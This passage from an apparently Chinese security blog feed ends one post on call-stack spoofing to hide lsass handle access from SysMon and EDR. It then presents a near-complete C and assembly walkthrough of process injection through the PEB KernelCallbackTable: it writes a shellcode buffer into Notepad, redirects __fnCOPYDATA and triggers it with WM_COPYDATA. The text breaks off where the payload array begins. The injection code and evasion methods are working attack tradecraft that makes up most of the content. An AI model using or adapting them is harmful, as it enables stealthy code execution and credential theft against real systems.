ret```<br><br></code></pre></td></tr></table></figure><p>一旦生成了断点异常（在线程返回并崩溃之前），我们可以像以前讨论的那样处理错误。此外，恢复伪造线程的状态并能够重用它将是一个改进，并停止需要反复创建“牺牲线程”。</p><p>此外，这种方法还可能被应用于睡眠混淆问题；一个具有合法调用栈的伪造线程可以被初始化为调用ntdll!NtDelayExecution（或WaitForSingleObject等），并使用向量化异常处理程序在睡眠时间返回时将流程重定向到主信标函数。</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>概念验证（PoC）代码可在此获取：<a href="https://github.com/countercept/CallStackSpoofer">CallStackSpoofer</a></p><p>该PoC包含三个示例调用栈（wmi&#x2F;rpc&#x2F;svchost），这些都是通过观察对lsass进程句柄访问从SysMon日志中精选的。可以通过’–wmi’、’–rpc’和’–svchost’参数选择这些调用栈配置。</p><p><img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--89414471-f36d-4079-ac09-c2a7771027e4/vulcan-raven-example.png?quality=82&preferwebp=true"></p><p>图4：展示了VulcanRaven获取lsass句柄时伪造调用栈以模拟RPC活动的过程。</p><p>上述截图展示了被SysMon记录的伪造调用栈（对比正常使用OpenProcess时的调用栈应为：VulcanRaven.exe -&gt; kernelbase!OpenProcess -&gt; ntdll!NtOpenProcess）。值得注意的是，虽然这个PoC中的示例是模仿SysMon发现的真实事件，但调用栈可以是任意构造的，如下图所示：</p><p><img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--dbb0da97-ac3b-4877-a6dc-acf5f03813f7/nonsense-call-stack-example.png?quality=82&preferwebp=true"></p><p>图5：WinDbg截图展示了在调用NtOpenProcess时使用的完全任意的伪造调用栈。</p><p>这项技术之所以引起攻击者的兴趣，主要是因为大多数远程访问木马（如信标）仍在使用浮动或无后备内存操作。因此，当攻击者将mimikatz直接注入内存时，来自这些注入代码的句柄访问会产生明显异常的调用栈。</p><p>下面是一个来自未备份内存调用OpenProcess的SysMon事件示例：</p><p><img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--8745809b-c509-4b54-a820-e864b0a074dc/sysmon-unbacked-lsass-access.png?quality=82&preferwebp=true"></p><p>图6：展示了来自未备份内存的lsass句柄访问SysMon事件。</p><p>这是使用Stephen Fewer的ReflectiveDLLInjection代码库修改版本生成的示例。</p><p>在此示例中，一个反射式DLL被注入到cmd.exe中，随后获取了对lsass的PROCESS_ALL_ACCESS访问权限。由于调用源自未备份内存，SysMon将调用栈中的最后一个条目标记为”UNKNOWN”（即堆栈回溯中最后一个返回地址属于浮动或未备份代码，而非合法加载的模块），这显然很可疑。</p><p>但是，当我们将上述VulcanRaven PoC修改为反射式DLL运行时，生成了如下事件：</p><p>图7：展示了作为反射式DLL运行的Vulcan Raven。尽管代码来自未备份内存，但访问lsass句柄的调用栈被成功伪装成合法操作。</p><p>“CallTrace”被伪造成了符合SysMon预期的值。从调用栈上看不出NtOpenProcess&#x2F;OpenProcess的调用实际来自未备份内存中的代码，线程表面上完全合法（虽然使用cmd.exe本身就很可疑）。此外还要注意图1中不同的GrantedAccess值，这里使用了PROCESS_ALL_ACCESS&#x2F;0x1FFFFF。</p><p>显然，攻击者可以根据注入目标进程（如wmi、procexp、svchost等常见的lsass句柄访问者）来定制相应的调用栈。</p><p>以下是我建议的优化版本，使内容更加清晰易懂：</p>]]></content>
    
    
    <categories>
      
      <category>EDR</category>
      
    </categories>
    
    
    <tags>
      
      <tag>主机安全</tag>
      
      <tag>EDR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用内核回调表进程注入</title>
    <link href="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<img src="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/POC.png" class="" title="POC"><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[toc]</p><hr><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>攻击者可以劫持进程环境块 （PEB） 中的内核回调表，以重定向进程的执行流，从而使他们能够执行恶意负载。此方法允许攻击者通过将合法函数指针替换为恶意函数指针（通常由 Windows 消息触发）来保持持久性。</p><p>这种方法被 MITRE 认定为劫持执行流程和持久性技术，已被 FinFisher&#x2F;FinSpy 和 Lazarus 等威胁组织使用。</p><p>在这篇博客中，我们将探讨 PEB，如何操作 Kernel Callback Table，以及如何将这种技术应用于进程注入，以在目标进程中秘密执行代码。</p><hr><h2 id="参考-PoC"><a href="#参考-PoC" class="headerlink" title="参考 PoC"></a>参考 PoC</h2><p>链接 -&gt; <a href="https://github.com/0xHossam/KernelCallbackTable-Injection-PoC">https://github.com/0xHossam/KernelCallbackTable-Injection-PoC</a></p><hr><h2 id="了解过程环境块-（PEB）"><a href="#了解过程环境块-（PEB）" class="headerlink" title="了解过程环境块 （PEB）"></a>了解过程环境块 （PEB）</h2><p>进程环境块 （PEB） 是 Windows 中每个正在运行的程序都依赖的关键结构。将其视为“控制中心”或“中心”，其中包含有关程序如何运行以及与系统交互的基本信息。PEB 是进程内存空间的一部分，它可以帮助操作系统和程序管理各种内部细节。</p><p>PEB 存储重要数据，例如：</p><ul><li><p>加载的模块 - 这些是程序运行所需的动态链接库 （DLL） 或外部库。例如，程序通常依赖于 kernel32.dll 或 user32.dll 等系统库提供的其他代码，并且 PEB 会在加载这些库后对其进行跟踪。</p></li><li><p>堆信息 - PEB 的此部分包含有关程序内存管理的信息。“堆” 是程序在其中存储运行时所需数据的内存区域。PEB 有助于管理和监控此内存的使用情况，从而跟踪分配和释放。</p></li><li><p>进程开始时间 - PEB 还存储进程的创建时间，这对于了解程序的运行时间非常有用。</p></li><li><p>线程信息 - 每个程序都通过“线程”运行任务或操作，PEB 包含有关这些线程的数据。这有助于操作系统管理程序同时运行的不同任务。</p></li><li><p>进程标志和设置 - PEB 包含描述进程行为方式的标志和配置数据。这可能包括安全设置、用于调试的特殊标志，甚至进程是否作为另一个进程的子系统运行。</p></li><li><p>内存布局信息 - PEB 还保存有关进程内存布局的数据，例如程序代码、数据和资源的不同部分在内存中的位置。</p></li></ul><hr><h2 id="浏览内核回调表"><a href="#浏览内核回调表" class="headerlink" title="浏览内核回调表"></a>浏览内核回调表</h2><p>PEB 中是内核回调表，这是在user32.dll加载到图形用户界面 （GUI） 进程时初始化的函数指针数组。此表包含指向处理窗口消息和其他进程间通信的各种回调函数的指针。此表中的每个函数都对应于特定任务，例如处理数据传输消息或管理窗口销毁事件。</p><p>例如，调用 Kernel Callback Table 中的 __fnCOPYDATA 函数以响应 WM_COPYDATA 窗口消息。此功能有助于在应用程序之间传输数据，允许一个进程将数据无缝发送到另一个进程。通过了解 Kernel Callback Table 中每个函数的结构和用途，我们可以理解进程如何交互和处理各种系统事件。</p><hr><h2 id="查找和分析内核回调表"><a href="#查找和分析内核回调表" class="headerlink" title="查找和分析内核回调表"></a>查找和分析内核回调表</h2><p>内核回调表是 Windows 上 GUI 进程的进程环境块 （PEB） 中的关键结构。攻击者可以修改此表，通过将特定函数指针重定向到恶意负载来劫持进程的执行流。本指南提供了在 WinDbg 中查找和分析内核回调表并了解其在进程注入中的作用的分步说明。</p><h3 id="查找-PEB-和内核回调表"><a href="#查找-PEB-和内核回调表" class="headerlink" title="查找 PEB 和内核回调表"></a>查找 PEB 和内核回调表</h3><ol><li><strong>识别 PEB 结构</strong></li></ol><ul><li><p>可以在 WinDbg 中使用 dt 命令浏览 PEB，该命令显示有关结构的详细信息。KernelCallbackTable 通常位于 PEB 中 +0x058 的偏移量处。</p></li><li><p>在 WinDbg 中使用以下命令：</p><p>dt ntdll！PEB系列</p></li><li><p>这将显示 PEB 结构及其字段，包括偏移量 +0x058 处的 KernelCallbackTable，显示 Kernel Callback Table 指针所在的位置。</p><img src="/2024/11/12/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A1%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/image.png" class="" title="PEB structure"></li></ul><ol start="2"><li><strong>找到内核回调表地址</strong></li></ol><ul><li><p>识别出 PEB 中的 KernelCallbackTable 字段后，通过访问该字段直接找到其地址：</p><pre><code class="hljs">dt ntdll!PEB @$peb.KernelCallbackTable</code></pre></li><li><p>此命令提供 PEB 中内核回调表的特定地址，该地址包含函数指针数组。</p></li></ul><ol start="3"><li><strong>检查内核回调表内容</strong></li></ol><ul><li><p>获取内核回调表的地址后，使用 dqs 命令在 WinDbg 中显示其内容。此命令显示从指定地址开始的每个四字（64 位条目），并显示表中的回调函数指针。</p><p>DQS 0x00007ffa’29123070 L60</p></li><li><p>此命令显示 Kernel Callback Table 中的前 60 个四字（480 字节），允许您直接检查回调函数地址。</p></li></ul><h3 id="分析-Kernel-Callback-Table-中的函数指针"><a href="#分析-Kernel-Callback-Table-中的函数指针" class="headerlink" title="分析 Kernel Callback Table 中的函数指针"></a>分析 Kernel Callback Table 中的函数指针</h3><p>在内核回调表中，每个条目对应于一个指向回调函数的指针，当收到特定 Windows 消息时，进程可以调用该函数。某些函数指针（如 __fnCOPYDATA）特别有趣，因为它们通过消息（如 WM_COPYDATA）处理数据传输。通过识别和分析这些指针，您可以了解流程如何处理某些事件。</p><ol><li><strong>确定 __fnCOPYDATA 条目</strong></li></ol><ul><li><p>__fnCOPYDATA 函数通常用于注入技术中，因为它可以通过WM_COPYDATA消息触发，从而允许在进程之间传递数据。</p></li><li><p>将 dqs 命令与 Kernel Callback Table 的基址一起使用，以列出特定的函数指针，包括 __fnCOPYDATA。</p><p>DQS 0x00007ffa’29123070 L10</p></li><li><p>输出示例：</p><pre><code class="hljs">00007ffa`29123070  00007ffa`290c2bd0 user32!_fnCOPYDATA00007ffa`29123078  00007ffa`2911ae70 user32!_fnCOPYGLOBALDATA00007ffa`29123080  00007ffa`290c0420 user32!_fnDWORD...</code></pre></li><li><p>每个条目对应于 Kernel Callback Table 中的一个函数指针。此处，user32！_fnCOPYDATA 显示了 __fnCOPYDATA 的地址，在处理 WM_COPYDATA 消息时，可以重定向该地址以执行自定义代码。</p></li></ul><hr><h2 id="通过内核回调表操作进行进程注入"><a href="#通过内核回调表操作进行进程注入" class="headerlink" title="通过内核回调表操作进行进程注入"></a>通过内核回调表操作进行进程注入</h2><p>攻击者可以操纵进程的 Kernel Callback Table 来劫持其执行流，迫使其运行注入的代码。内核回调表是进程的进程环境块 （PEB） 中的函数指针数组，当user32.dll加载到任何图形用户界面 （GUI） 进程中时，其中填充了回调函数。这些回调函数支持系统和进程之间的通信，从而允许进程响应特定的 Windows 消息。</p><p>要使用 Kernel Callback Table 劫持执行流，攻击者可以将一个或多个原始回调函数指针替换为指向恶意代码的指针。此方法提供了一种将执行从合法回调重定向到注入的有效负载的方法。修改这些函数指针通常是通过使用 Reflective Code Loading 或 Process Injection 来实现的。例如，攻击者可以通过 NtQueryInformationProcess 函数（一种公开进程内部的低级别 Windows API 调用）检索 PEB 地址来找到内核回调表。找到 PEB 后，攻击者即可获得对内核回调表的访问权限，并可以继续将回调函数指针（如 __fnCOPYDATA）替换为恶意负载的地址。</p><p>进行此修改后，可以更新 PEB 以引用更改后的内核回调表，该表现在包含注入的有效负载。恶意函数通常在将特定 Windows 消息发送到目标进程时触发，从而激活更改的回调函数，从而激活注入的有效负载。由于此操作发生在目标进程的内存中，因此它通过掩盖合法进程下有效负载的执行来有效地逃避检测。</p><p>一旦执行被劫持并执行有效负载，高级攻击者可能会将原始内核回调表恢复到其合法状态，以进一步逃避检测。</p><h3 id="步骤-1-启用调试权限"><a href="#步骤-1-启用调试权限" class="headerlink" title="步骤 1 - 启用调试权限"></a>步骤 1 - 启用调试权限</h3><p>在一个进程可以操纵另一个进程的内存之前，出于测试目的，我需要启用一些调试权限。调试权限允许当前进程访问其他进程的敏感区域，这些区域对于内存读取和写入等任务是必需的。如果没有这些权限，Windows 安全性将限制对其他进程的访问，从而无法注入。</p><p>EnableDebugPrivilege 函数通过修改当前进程的令牌以启用 SE_DEBUG_NAME 权限来提升权限。</p><pre><code class="hljs">void EnableDebugPrivilege() &#123;    printf( &quot;[*] Enabling Debug Privilege...\n&quot; );    HANDLE hToken;    TOKEN_PRIVILEGES tkp;    if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) &#123;        LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;tkp.Privileges[ 0 ].Luid );        tkp.PrivilegeCount = 1;        tkp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;        AdjustTokenPrivileges( hToken, FALSE, &amp;tkp, sizeof( tkp ), NULL, NULL );        CloseHandle( hToken );    &#125; else &#123;        printf( &quot;[-] Failed to enable Debug Privilege.\n&quot; );    &#125;&#125;</code></pre><p><strong>详细说明</strong></p><ol><li>OpenProcessToken 打开当前进程的访问令牌的句柄，该令牌拥有安全权限。</li><li>LookupPrivilegeValue 检索权限 SE_DEBUG_NAME 的本地唯一标识符 （LUID），该标识符授予进程调试功能。</li><li>AdjustTokenPrivileges 在令牌中设置权限以启用调试权限，从而允许进程对其他进程执行内存操作。</li></ol><h3 id="步骤-2-加载-NtQueryInformationProcess"><a href="#步骤-2-加载-NtQueryInformationProcess" class="headerlink" title="步骤 2 - 加载 NtQueryInformationProcess"></a>步骤 2 - 加载 NtQueryInformationProcess</h3><p>ntdll.dll 的 NtQueryInformationProcess 函数是一个低级别 Windows API 函数，它提供对有关进程的特定信息的访问，包括进程环境块 （PEB）。PEB 包含内核回调表等结构，该表存储指向各种回调函数的指针。此函数必须动态加载，因为它通常无法通过标准 Windows 标头访问。</p><pre><code class="hljs">typedef NTSTATUS( NTAPI* pNtQueryInformationProcess )( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );void LoadNtQueryInformationProcess( pNtQueryInformationProcess &amp;NtQueryInformationProcess ) &#123;    printf( &quot;[*] Loading NtQueryInformationProcess...\n&quot; );    HMODULE hNtdll = GetModuleHandleA( &quot;ntdll.dll&quot; );    if ( hNtdll ) &#123;        NtQueryInformationProcess = ( pNtQueryInformationProcess ) GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot; );        if ( NtQueryInformationProcess ) &#123;            printf( &quot;[+] NtQueryInformationProcess loaded successfully at address: 0x%p\n&quot;, NtQueryInformationProcess );        &#125; else &#123;            printf( &quot;[-] Failed to resolve NtQueryInformationProcess address.\n&quot; );        &#125;    &#125;&#125;</code></pre><p><strong>详细说明</strong></p><ul><li>GetModuleHandle 会将ntdll.dll加载到进程中，从而访问其函数。</li><li>GetProcAddress 检索 NtQueryInformationProcess 的地址，以便稍后调用此函数以收集有关目标进程的详细信息。</li></ul><h3 id="步骤-3-—-启动-Target-流程"><a href="#步骤-3-—-启动-Target-流程" class="headerlink" title="步骤 3 — 启动 Target 流程"></a>步骤 3 — 启动 Target 流程</h3><p>进程注入首先创建一个 Notepad 实例，该实例将用作注入代码的目标。此示例使用 Notepad，因为它是一个简单、众所周知的应用程序，允许对注射过程进行受控测试。</p><pre><code class="hljs">STARTUPINFO si = &#123; sizeof( si ) &#125;;PROCESS_INFORMATION pi;printf( &quot;[*] Creating new Notepad process...\n&quot; );if ( !CreateProcess( L&quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi ) ) &#123;    printf( &quot;[-] Failed to create Notepad process. Error: %d\n&quot;, GetLastError() );    return -1;&#125;printf( &quot;[+] Notepad process created successfully. PID: %d\n&quot;, pi.dwProcessId );</code></pre><p><strong>详细说明</strong></p><ul><li>CreateProcess 在新控制台中启动记事本，并将进程信息存储在 pi 中。生成的进程 ID （pi.dwProcessId） 是必不可少的，因为它标识了记事本进程，以便进行后续的内存操作。</li></ul><h3 id="第-4-步-—-找到目标窗口和进程-ID"><a href="#第-4-步-—-找到目标窗口和进程-ID" class="headerlink" title="第 4 步 — 找到目标窗口和进程 ID"></a>第 4 步 — 找到目标窗口和进程 ID</h3><p>该代码找到记事本的窗口句柄并检索其进程 ID。此句柄提供与 Notepad 的连接，从而可以打开句柄来操作其内存。</p><pre><code class="hljs">HWND hWindow = NULL;DWORD waitTime = 0;const DWORD MAX_WAIT_TIME = 10000;while ( hWindow == NULL &amp;&amp; waitTime &lt; MAX_WAIT_TIME ) &#123;    hWindow = FindWindow( L&quot;Notepad&quot;, NULL );    if ( !hWindow ) &#123;        Sleep( 500 );        waitTime += 500;    &#125;&#125;if ( !hWindow ) &#123;    printf( &quot;[-] Failed to find Notepad window handle after waiting for %d milliseconds.\n&quot;, MAX_WAIT_TIME );    TerminateProcess( pi.hProcess, 0 );    CloseHandle( pi.hProcess );    CloseHandle( pi.hThread );    return -1;&#125;printf( &quot;[+] Window Handle found: 0x%p\n&quot;, hWindow );DWORD pid;GetWindowThreadProcessId( hWindow, &amp;pid );printf( &quot;[+] Process ID: %d\n&quot;, pid );</code></pre><p><strong>详细说明</strong></p><ul><li>FindWindow 按名称搜索记事本的 window 类并找到其句柄。如果找到句柄，GetWindowThreadProcessId 将检索关联的进程 ID。</li><li>此进程 ID 对于打开句柄以直接访问 Notepad 的内存是必需的。</li></ul><h3 id="第-5-步-打开目标进程的句柄"><a href="#第-5-步-打开目标进程的句柄" class="headerlink" title="第 5 步 - 打开目标进程的句柄"></a>第 5 步 - 打开目标进程的句柄</h3><p>使用进程 ID，代码将打开记事本的句柄。此句柄允许直接访问进程的内存，这对于注入至关重要。</p><pre><code class="hljs">HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid );if ( !hProcess ) &#123;    printf( &quot;[-] Failed to open target process. Error: %d\n&quot;, GetLastError() );    return -1;&#125;printf( &quot;[+] Process Handle: 0x%p\n&quot;, hProcess );</code></pre><p><strong>详细说明</strong></p><ul><li>OpenProcess 打开一个具有内存读取、写入和查询操作权限的句柄，允许注入器与记事本的内存交互。</li></ul><h3 id="步骤-6-检索-PEB-地址"><a href="#步骤-6-检索-PEB-地址" class="headerlink" title="步骤 6 - 检索 PEB 地址"></a>步骤 6 - 检索 PEB 地址</h3><p>NtQueryInformationProcess 用于检索目标进程的 PEB 地址。PEB 包含 Kernel Callback Table，这是此注入技术中修改的重点。</p><pre><code class="hljs">PROCESS_BASIC_INFORMATION pbi;ULONG returnLength;NTSTATUS status = NtQueryInformationProcess( hProcess, ProcessBasicInformation, &amp;pbi, sizeof( pbi ), &amp;returnLength );if ( status != 0 ) &#123;    printf( &quot;[-] Failed to query process information. NTSTATUS: 0x%lx\n&quot;, status );    return -1;&#125;PVOID PebBaseAddress = pbi.PebBaseAddress;printf( &quot;[*] PEB Address: 0x%p\n&quot;, PebBaseAddress );</code></pre><p><strong>详细说明</strong></p><ul><li>NtQueryInformationProcess 填充 PROCESS_BASIC_INFORMATION 结构（包括 PebBaseAddress），从而提供对 PEB 的访问权限，以便进一步操作内核回调表。</li></ul><h3 id="第-7-步-读取内核回调表"><a href="#第-7-步-读取内核回调表" class="headerlink" title="第 7 步 - 读取内核回调表"></a>第 7 步 - 读取内核回调表</h3><p>使用 PEB 地址，代码读取 Kernel Callback Table 的内存地址，从而允许修改此表中的函数指针以控制回调。</p><pre><code class="hljs">PVOID KernelCallbackTable;SIZE_T bytesRead = 0;if ( !ReadProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;KernelCallbackTable, sizeof( PVOID ), &amp;bytesRead ) ) &#123;    printf( &quot;[-] Failed to read KernelCallbackTable. Error: %d\n&quot;, GetLastError() );    return -1;&#125;printf( &quot;[*] KernelCallbackTable Address: 0x%p\n&quot;, KernelCallbackTable );</code></pre><p><strong>详细说明</strong></p><ul><li>ReadProcessMemory 在距 PEB 地址偏移量处访问 Kernel Callback Table，从而访问控制某些回调函数的指针。</li></ul><h3 id="第-8-步-为有效负载分配内存"><a href="#第-8-步-为有效负载分配内存" class="headerlink" title="第 8 步 - 为有效负载分配内存"></a>第 8 步 - 为有效负载分配内存</h3><p>有效负载（通常是 shellcode）在目标进程的内存空间内分配。内存标记为 executable 以确保代码可以运行。</p><pre><code class="hljs">unsigned char my_payload[] = &quot;...&quot;; SIZE_T shellcodeSize = sizeof( my_payload );LPVOID remotebuf = VirtualAllocEx( hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );if ( !remotebuf ) &#123;    printf( &quot;[-] Failed to allocate remote buffer. Error: %d\n&quot;, GetLastError() );    return -1;&#125;if ( !WriteProcessMemory( hProcess, remotebuf, my_payload, shellcodeSize, NULL ) ) &#123;    printf( &quot;[-] Failed to write payload to remote buffer. Error: %d\n&quot;, GetLastError() );    return -1;&#125;printf( &quot;[+] Payload written to remote buffer at: 0x%p\n&quot;, remotebuf );</code></pre><p><strong>详细说明</strong></p><ul><li>VirtualAllocEx 在目标进程中分配内存，并使用 PAGE_EXECUTE_READWRITE 对其进行标记，使其既可写又可执行。</li><li>WriteProcessMemory 将 shellcode 写入分配的空间，使其能够在触发时运行。</li></ul><h3 id="第-9-步-修改内核回调表"><a href="#第-9-步-修改内核回调表" class="headerlink" title="第 9 步 - 修改内核回调表"></a>第 9 步 - 修改内核回调表</h3><p>通过将 __fnCOPYDATA 指针重定向到注入的负载来修改 Kernel Callback Table。这使得 Windows 在 WM_COPYDATA 消息期间调用有效负载。</p><pre><code class="hljs">KERNELCALLBACKTABLE cKCT;if ( !ReadProcessMemory( hProcess, KernelCallbackTable, &amp;cKCT, sizeof( cKCT ), &amp;bytesRead ) ) &#123;    printf( &quot;[-] Failed to read existing KernelCallbackTable. Error: %d\n&quot;, GetLastError() );    return -1;&#125;cKCT.__fnCOPYDATA = ( ULONG_PTR ) remotebuf;LPVOID clonedcKCT = VirtualAllocEx( hProcess, NULL, sizeof( cKCT ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );if ( !clonedcKCT || !WriteProcessMemory( hProcess, clonedcKCT, &amp;cKCT, sizeof( cKCT ), NULL ) ) &#123;    printf( &quot;[-] Failed to clone KernelCallbackTable. Error: %d\n&quot;, GetLastError() );    return -1;&#125;</code></pre><p><strong>详细说明</strong></p><ul><li>ReadProcessMemory 检索 Kernel Callback Table 结构。__fnCOPYDATA 字段将重定向以指向有效负载，从而在WM_COPYDATA消息接收时启用其执行。</li></ul><h3 id="第-10-步-使用修改后的表更新-PEB"><a href="#第-10-步-使用修改后的表更新-PEB" class="headerlink" title="第 10 步 - 使用修改后的表更新 PEB"></a>第 10 步 - 使用修改后的表更新 PEB</h3><p>更改后的内核回调表将写入 PEB，确保 Windows 引用此修改后的版本。</p><pre><code class="hljs">if ( !WriteProcessMemory( hProcess, ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ), &amp;clonedcKCT, sizeof( PVOID ), &amp;bytesRead ) ) &#123;    printf( &quot;[-] Failed to update PEB KernelCallbackTable. Error: %d\n&quot;, GetLastError() );    return -1;&#125;printf( &quot;[+] PEB KernelCallbackTable updated successfully!\n&quot; );</code></pre><p><strong>详细说明</strong></p><ul><li>WriteProcessMemory 将修改后的表写入 PEB，使更改的回调结构处于活动状态，以准备触发有效负载。</li></ul><h3 id="第-11-步-触发-Payload"><a href="#第-11-步-触发-Payload" class="headerlink" title="第 11 步 - 触发 Payload"></a>第 11 步 - 触发 Payload</h3><p>该代码发送一条 WM_COPYDATA 消息，该消息激活 Kernel Callback Table 中的 __fnCOPYDATA 函数，并执行有效负载。</p><pre><code class="hljs">COPYDATASTRUCT cds;WCHAR msg[] = L&quot;trigger&quot;;cds.dwData = 1;cds.cbData = ( lstrlenW( msg ) + 1 ) * sizeof( WCHAR );cds.lpData = msg;LRESULT result = SendMessage( hWindow, WM_COPYDATA, ( WPARAM ) hWindow, ( LPARAM ) &amp;cds );if ( result == 0 &amp;&amp; GetLastError() != 0 ) &#123;    printf( &quot;[-] Failed to send message to trigger payload. Error: %d\n&quot;, GetLastError() );    return -1;&#125;printf( &quot;[+] Payload triggered!\n&quot; );</code></pre><h3 id="第-12-步-清理"><a href="#第-12-步-清理" class="headerlink" title="第 12 步 - 清理"></a>第 12 步 - 清理</h3><p>最后，释放内存分配并关闭处理，确保干净退出并最大限度地降低检测风险。</p><pre><code class="hljs">VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );VirtualFreeEx( hProcess, clonedcKCT, 0, MEM_RELEASE );CloseHandle( hProcess );CloseHandle( pi.hProcess );CloseHandle( pi.hThread );printf( &quot;[+] Cleanup completed successfully.\n&quot; );</code></pre><p>此过程演示了通过 Kernel Callback Table 操作进行分步代码注入，从而提供对目标进程上下文中执行的完全控制。</p><hr><h2 id="帮助程序程序集代码"><a href="#帮助程序程序集代码" class="headerlink" title="帮助程序程序集代码"></a>帮助程序程序集代码</h2><p>为了增强注入过程，我们使用了 helper.asm 中定义的一些汇编函数。这些函数帮助我们找到 PEB 并更有效地操作 Kernel Callback Table。</p><h3 id="定位PEB"><a href="#定位PEB" class="headerlink" title="定位PEB"></a>定位PEB</h3><p>此函数通过访问 gs 段寄存器来检索当前进程的 PEB 地址，该寄存器指向 x64 体系结构中的线程信息块 （TIB）。</p><pre><code class="hljs">LocatePEB PROC    mov rax, qword ptr gs:[60h] ; Access PEB in x64    retLocatePEB ENDP</code></pre><h3 id="UnhingCallbackTable"><a href="#UnhingCallbackTable" class="headerlink" title="UnhingCallbackTable"></a>UnhingCallbackTable</h3><p>给定 RCX 寄存器中的 PEB 地址，此函数通过访问 PEB 结构中偏移量为 0x58 的内存来检索内核回调表的地址。</p><pre><code class="hljs">ResolveKernelCallbackTable PROC    mov rax, qword ptr [rcx + 58h] ; Offset for KernelCallbackTable in PEB (0x58)    retResolveKernelCallbackTable ENDP</code></pre><h3 id="写入内核回调表"><a href="#写入内核回调表" class="headerlink" title="写入内核回调表"></a>写入内核回调表</h3><p>该函数通过向指定的偏移量写入新地址来更新 PEB 中的 Kernel Callback Table 地址。</p><pre><code class="hljs">WriteKernelCallbackTable PROC    mov qword ptr [rcx + 58h], rdx    ; Write the new KernelCallbackTable address    retWriteKernelCallbackTable ENDP</code></pre><p>这些汇编函数简化了与 PEB 和内核回调表交互的过程，使我们的 C++ 代码更简洁、更高效。</p><hr><h2 id="把它们放在一起！"><a href="#把它们放在一起！" class="headerlink" title="把它们放在一起！"></a>把它们放在一起！</h2><p>main.c</p><pre><code class="hljs">#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &quot;struct.h&quot;#include &quot;helper.h&quot;void LoadNtQueryInformationProcess()&#123;    printf( COLOR_YELLOW_BOLD &quot;[*] Loading NtQueryInformationProcess...\n&quot; COLOR_RESET );    HMODULE hNtdll = GetModuleHandle( L&quot;ntdll.dll&quot; );    if ( hNtdll )    &#123;        NtQueryInformationProcess = ( PFN_NTQUERYINFORMATIONPROCESS ) GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot; );        if ( NtQueryInformationProcess )        &#123;            printf( COLOR_GREEN_BOLD &quot;[+] NtQueryInformationProcess loaded successfully at address: 0x%p\n&quot; COLOR_RESET, NtQueryInformationProcess );        &#125;        else        &#123;            printf( COLOR_RED_BOLD &quot;\t[-] Failed to resolve NtQueryInformationProcess address.\n&quot; COLOR_RESET );        &#125;    &#125;&#125;void EnableDebugPrivilege()&#123;    printf( COLOR_YELLOW_BOLD &quot;[*] Enabling Debug Privilege...\n&quot; COLOR_RESET );    HANDLE hToken;    TOKEN_PRIVILEGES tkp;    if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) )    &#123;        LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;tkp.Privileges[ 0 ].Luid );        tkp.PrivilegeCount = 1;        tkp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;        AdjustTokenPrivileges( hToken, FALSE, &amp;tkp, sizeof( tkp ), NULL, NULL );        CloseHandle( hToken );        // printf( COLOR_GREEN_BOLD &quot;\t[+] Debug Privilege enabled.\n&quot; COLOR_RESET );    &#125;    else    &#123;        printf( COLOR_RED_BOLD &quot;\t[-] Failed to enable Debug Privilege.\n&quot; COLOR_RESET );    &#125;&#125;</code></pre><p>​    </p><pre><code class="hljs">unsigned char payload[] = 